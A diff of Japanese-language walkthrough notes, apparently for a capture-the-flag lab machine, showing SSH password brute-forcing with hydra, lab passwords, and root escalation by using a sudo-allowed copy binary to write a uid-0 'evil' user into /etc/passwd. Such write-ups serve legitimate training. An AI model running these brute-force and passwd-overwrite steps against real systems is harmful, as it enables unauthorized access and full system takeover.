@@ -36,16 +36,20 @@
   - users.txtとpassword.txtにわける
 - `hydra -L users.txt -P password.txt ssh://$IP`
 - janitorになる
-  - `ssh janitor@$IP`
+  - `ssh janitor@$IP` passwordは`Ilovepeepee`
   - `id`はjanitorだけ
   - `ls -l /home`ユーザはたくさんいるが、Permissionを見たら他のユーザ見れない
   - SUIDするが何もない
   - `sudo -l`もない
   - janitorのホームの隠しファイルにパスワードがあるので、password.txtに追加して、もう一度hydra
 - fredfになる
-  - `su fredf`
-  - `sudo -l`をするとtestというコマンドができるのがわかる。testコマンドはpasswdに書き込みができるコマンドらしい
+  - `su fredf`はpasswordは`B4-Tru3-001`
+  - `sudo -l`をするとtestというコマンドができるのがわかる。testコマンドを見ると実行ファイルであることがわかる
+  - `cd /opt/devstuff`を見ると実行ファイル前のtest.pyがあるので中身を見ると第一引数から第二引数にコピーできるコマンドであることがわかる
 - rootになる
-  - `openssl passwd -1 パスワード`をコピーして/tmp/akを作って、akに書く
-  - `evil:ハッシュ:0:0:root:/home/root:bin/bash`
-  - `sudo ./test /tmp/ak /etc/passwd`
+  - `/etc/passwd`にrootのユーザを作ることにする
+  - `openssl passwd -1`コマンドでパスワードを作るパスワードはtintinにしておく。コピーする
+  - `echo 'evil:コピーを貼る:0:0:root:/home/evil:/bin/bash' > /tmp/unko`
+  - `sudo /opt/devstuff/dist/test/test /tmp/unko /etc/passwd`
+  - `cat /etc/passwd`にevilユーザが追加されているのがわかる
+  - `su evil`でパスワードは`tintin`
